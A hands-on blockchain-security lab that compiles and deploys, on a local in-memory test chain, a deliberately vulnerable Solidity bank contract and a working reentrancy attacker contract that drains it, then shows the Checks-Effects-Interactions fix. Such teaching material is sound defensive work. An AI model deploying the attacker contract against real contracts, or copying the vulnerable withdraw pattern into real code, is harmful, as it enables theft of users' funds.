---
title: 'Chapter 6: Hands-On Lab: Reentrancy Attack & Remediation'
description: This lab provides a self-contained Python script using `web3.py` and
  the `py-solc-x` compiler to simulate a local blockchain environment, deploy a vul...
keywords:
- AppSec
- Cybersecurity
- Security
- Guide
- Tutorial
- '07'
- Specialized
- Blockchain
- Security
- '06'
- Hands
- 'On'
- Lab
- Md
slug: /specialized/blockchain-security/hands-on-lab
---


# Chapter 6: Hands-On Lab: Reentrancy Attack & Remediation

This lab provides a self-contained Python script using `web3.py` and the `py-solc-x` compiler to simulate a local blockchain environment, deploy a vulnerable contract, exploit it, and then deploy a secure version.

## Prerequisites
```bash
pip3 install web3 py-solc-x
```

## Lab Script (`reentrancy_lab.py`)

Save the following code as `reentrancy_lab.py` and run it.

```python
import solcx
from web3 import Web3, EthereumTesterProvider

# Install solc compiler if not present
solcx.install_solc('0.8.0')

# Connect to local in-memory blockchain
w3 = Web3(EthereumTesterProvider())
w3.eth.default_account = w3.eth.accounts[0]

# --- 1. Contract Source Code ---
contracts_source = '''
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed");

        balances[msg.sender] = 0;
    }
}

contract Attacker {
    VulnerableBank public bank;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(); // The reentrancy loop
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
}
'''

# --- 2. Compile Contracts ---
print("Compiling contracts...")
compiled_sol = solcx.compile_source(
    contracts_source,
    output_values=["abi", "bin"],
    solc_version="0.8.0"
)

bank_interface = compiled_sol['<stdin>:VulnerableBank']
attacker_interface = compiled_sol['<stdin>:Attacker']

# --- 3. Deploy Bank and Victim Deposit ---
print("Deploying VulnerableBank...")
Bank = w3.eth.contract(abi=bank_interface['abi'], bytecode=bank_interface['bin'])
tx_hash = Bank.constructor().transact()
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
bank_address = tx_receipt.contractAddress
bank_contract = w3.eth.contract(address=bank_address, abi=bank_interface['abi'])

victim_account = w3.eth.accounts[1]
print(f"Victim depositing 5 ETH into Bank...")
bank_contract.functions.deposit().transact({'from': victim_account, 'value': w3.to_wei(5, 'ether')})

print(f"Bank Balance: {w3.from_wei(w3.eth.get_balance(bank_address), 'ether')} ETH")

# --- 4. Deploy Attacker and Execute Exploit ---
attacker_account = w3.eth.accounts[2]
print("\nDeploying Attacker Contract...")
Attacker = w3.eth.contract(abi=attacker_interface['abi'], bytecode=attacker_interface['bin'])
tx_hash = Attacker.constructor(bank_address).transact({'from': attacker_account})
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
attacker_address = tx_receipt.contractAddress
attacker_contract = w3.eth.contract(address=attacker_address, abi=attacker_interface['abi'])

print(f"Executing Reentrancy Attack with 1 ETH...")
attacker_contract.functions.attack().transact({
    'from': attacker_account, 
    'value': w3.to_wei(1, 'ether'),
    'gas': 3000000
})

print(f"Bank Balance after attack: {w3.from_wei(w3.eth.get_balance(bank_address), 'ether')} ETH")
print(f"Attacker Contract Balance: {w3.from_wei(w3.eth.get_balance(attacker_address), 'ether')} ETH")
```

## Remediation Challenge
Modify the `VulnerableBank` source code in the script above. Apply the **Checks-Effects-Interactions** pattern to the `withdraw` function. Run the script again and observe that the attack fails.

```solidity
    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        // EFFECTS (State change first!)
        balances[msg.sender] = 0;

        // INTERACTIONS (External call last)
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed");
    }
```
